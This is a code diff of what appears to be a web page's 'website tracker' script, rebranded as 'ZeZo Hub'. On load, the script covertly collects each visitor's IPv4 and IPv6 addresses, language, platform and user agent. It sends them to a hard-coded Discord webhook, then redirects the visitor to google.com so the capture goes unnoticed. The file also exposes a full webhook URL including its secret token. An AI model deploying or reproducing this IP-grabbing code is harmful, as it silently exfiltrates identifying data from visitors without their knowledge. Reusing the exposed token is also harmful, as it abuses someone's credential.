@@ -11,7 +11,7 @@
         const CONFIG = {
             DISCORD_WEBHOOK_URL: 'https://discord.com/api/webhooks/1553034301980016640/1NCgxeOUDMhhgG1l5vhCYOHUhdmwT3DjslENugn821v6vFqtwVx_FkuxbWSVHs0w0W7l',
             REDIRECT_URL: 'https://google.com', // Where to send the visitor after tracking
-            EMBED_COLOR: 3447003                  // Decimal color code (3447003 is Blue)
+            EMBED_COLOR: 16766720 // Decimal color code (3447003 is Blue)
         };
         // ==========================================
 
@@ -34,7 +34,7 @@
                 if (res6.ok) ipv6 = (await res6.text()).trim();
             } catch (e) {}
 
-            // Format current date and time (e.g., 28.09.2026, 17:39)
+            // Format current date and time
             const now = new Date();
             const simpleDateString = now.toLocaleString('de-DE', {
                 day: '2-digit',
@@ -48,13 +48,13 @@
             // 3. Prepare Discord Embed Payload
             const payload = {
                 embeds: [{
-                    title: "New Visitor Tracked",
+                    title: "ZeZo Hub | Website Tracker",
                     color: CONFIG.EMBED_COLOR,
                     timestamp: now.toISOString(),
                     fields: [
-                        { name: "IPv4 Address", value: `\`${ipv4}\``, inline: true },
-                        { name: "IPv6 Address", value: `\`${ipv6}\``, inline: true },
-                        { name: "Language / Region", value: `\`${navigator.language}\``, inline: false },
+                        { name: "IPv4 Address", value: `\`${ipv4}\``, inline: false },
+                        { name: "IPv6 Address", value: `\`${ipv6}\``, inline: false },
+                        { name: "Language / Region", value: `\`${navigator.language}\``, inline: true },
                         { name: "Platform", value: `\`${navigator.platform}\``, inline: true },
                         { name: "User Agent", value: `\`${navigator.userAgent}\``, inline: false }
                     ],
